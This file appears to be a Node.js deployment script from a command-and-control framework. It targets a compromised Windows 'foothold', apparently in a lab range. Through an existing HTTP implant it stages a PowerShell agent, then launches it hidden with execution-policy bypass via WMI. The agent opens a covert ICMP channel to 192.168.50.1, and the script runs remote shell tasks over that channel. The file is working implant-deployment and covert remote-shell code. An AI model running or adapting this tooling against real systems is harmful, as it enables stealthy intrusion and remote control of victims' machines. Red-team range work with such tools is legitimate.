// deploy-icmp-agent.mjs — channel-deploys the ICMP transport to the live range foothold.
// The whole flow rides the governed channel (no guest-ops, no offline disk edits):
//   1. register a fresh agent identity for the ICMP transport
//   2. stage the current varvel-agent.ps1 to the online HTTP agent (sha256-verified write)
//   3. discover the agent sandbox via a 'cd' shell task (result preview)
//   4. have the HTTP agent launch the ICMP agent detached (cmd start)
//   5. watch the channel until icmp.liveVerified flips (an authenticated ICMP frame
//      advanced the new agent's seq — the observed round trip, never asserted)
//   6. task the ICMP agent ('hostname') and confirm the result lands over ICMP
// Usage: node scripts/deploy-icmp-agent.mjs [--api http://127.0.0.1:8971] [--agent <id>]
const API = (process.argv.includes('--api') ? process.argv[process.argv.indexOf('--api') + 1] : null) || 'http://127.0.0.1:8971';
const ENCLAVE = (process.argv.includes('--enclave') ? process.argv[process.argv.indexOf('--enclave') + 1] : null) || 'http://127.0.0.1:8977';
const FORCED = process.argv.includes('--agent') ? process.argv[process.argv.indexOf('--agent') + 1] : null;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function j(path, opts = {}) {
  const r = await fetch(API + path, opts.method ? { method: opts.method, headers: { 'content-type': 'application/json' }, body: JSON.stringify(opts.body || {}) } : undefined);
  return r.json();
}
// The Enclave's session watchdog reverts the lab when the console churns — the ONLY way
// a mid-flow deploy survives is an auto-expiring hold (server-side, max 60min).
async function hold(minutes) {
  try {
    const r = await (await fetch(ENCLAVE + '/api/vm-lab/hold', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ owner: 'deploy-icmp-agent', minutes }) })).json();
    if (r.ok) { console.log('[hold] lab held until ' + r.until); return true; }
  } catch {}
  console.log('[hold] WARNING: could not hold the lab (old Enclave?) — teardowns may kill this deploy');
  return false;
}
async function releaseHold() { try { await fetch(ENCLAVE + '/api/vm-lab/release', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ owner: 'deploy-icmp-agent' }) }); } catch {} }
async function waitTask(agentId, taskId, timeoutMs = 60000) {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const t = (tasks || []).find((x) => x.taskId === taskId);
    if (t && t.status === 'resulted') return t;
    await sleep(1500);
  }
  throw new Error('task ' + taskId + ' did not result within ' + timeoutMs + 'ms');
}
async function shell(agentId, cmd, timeoutMs) {
  const { taskId } = await j('/api/channel/task', { method: 'POST', body: { agentId, kind: 'shell', data: cmd } });
  if (!taskId) throw new Error('task rejected for ' + agentId);
  return waitTask(agentId, taskId, timeoutMs);
}

const run = async () => {
  // 0) locate the online HTTP foothold
  const st = await j('/api/channel');
  if (!st.armed) throw new Error('channel not armed');
  const agents = (st.agents || []).filter((a) => a.health === 'active' || a.health === 'stale');
  const aId = FORCED || (agents[0] && agents[0].agentId);
  if (!aId) throw new Error('no live agent on the channel — is the range foothold online?');
  console.log('[0] foothold agent:', aId);
  if (!st.icmp || !st.icmp.armed) throw new Error('channel ICMP bridge not armed (VARVEL_ICMP=1?) — ' + JSON.stringify(st.icmp || null));
  console.log('[0] channel icmp:', st.icmp.reason);
  await hold(20); // watchdog deferral for the whole flow; auto-expires if we die

  // 1) fresh identity for the ICMP transport
  const reg = await j('/api/channel/agent', { method: 'POST', body: { action: 'register', label: 'icmp-transport', tags: ['range', 'win11', 'icmp'] } });
  console.log('[1] icmp agent identity:', reg.agentId);

  // 2) stage the agent file (the exact bytes validated by scripts/icmp-ps-parity.ps1)
  const { readFileSync } = await import('node:fs');
  const file = new URL('../varvel/agents/varvel-agent.ps1', import.meta.url);
  const b64 = readFileSync(file).toString('base64');
  const st2 = await j('/api/channel/stage', { method: 'POST', body: { agentId: aId, name: 'varvel-agent.ps1', b64 } });
  if (!st2.taskId) throw new Error('stage rejected: ' + JSON.stringify(st2));
  const staged = await waitTask(aId, st2.taskId);
  console.log('[2] staged:', staged.resultPreview);

  // 3) sandbox = agent CWD + \agentbox
  const cwd = await shell(aId, 'cd');
  const dir = String(cwd.resultPreview || '').trim();
  if (!/^[A-Za-z]:\\/.test(dir)) throw new Error('could not read agent CWD: ' + JSON.stringify(cwd));
  const agentPath = dir + '\\agentbox\\varvel-agent.ps1';
  console.log('[3] agent file on target:', agentPath);

  // 4) launch the ICMP agent DETACHED via Win32_Process.Create (WMI) — the only pattern
  // proven to leave zero shared handles/consoles with the foothold's shell wrapper.
  // `start` (even with <NUL >NUL) hangs the agent's `cmd /c ... | Out-String` on the
  // grandchild's pipe inheritance — TWICE verified, each time freezing the foothold's
  // task loop. WMI Create spawns under winmgmt: fully detached, returns 0 instantly.
  // The PS payload contains NO double quotes and NO cmd-special chars on purpose —
  // the channel wraps Task.data in `cmd /c "<data> 2>&1"` and parsing must stay trivial.
  const psCmd = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File " + agentPath + " -Url icmp://192.168.50.1 -AgentId " + reg.agentId + " -Token " + reg.token + " -Transport icmp'}; $r.ReturnValue";
  const lr = await shell(aId, psCmd);
  if (!/0/.test(String(lr.resultPreview || '').trim())) throw new Error('Win32_Process.Create returned: ' + lr.resultPreview);
  console.log('[4] launch task issued (WMI detached)');

  // 5) the flip: liveVerified sets only when an authenticated ICMP frame advances a seq
  const end = Date.now() + 90000;
  let icmp = null;
  while (Date.now() < end) {
    const s = await j('/api/channel');
    icmp = s.icmp;
    if (icmp && icmp.liveVerified) break;
    await sleep(2000);
  }
  if (!icmp || !icmp.liveVerified) throw new Error('liveVerified never flipped — last icmp status: ' + JSON.stringify(icmp));
  console.log('[5] liveVerified = true (observed authenticated ICMP round trip)');

  // 6) governed duplex proof: task over ICMP, result over ICMP
  const t = await shell(reg.agentId, 'hostname', 60000);
  console.log('[6] icmp task resulted:', JSON.stringify(t.resultPreview));
  return { ok: true, icmpAgent: reg.agentId, liveVerified: true, preview: t.resultPreview };
};

run().then((r) => { console.log('DEPLOY-OK', JSON.stringify(r)); releaseHold().finally(() => process.exit(0)); })
  .catch((e) => { console.error('DEPLOY-FAIL', e.message); releaseHold().finally(() => process.exit(1)); });
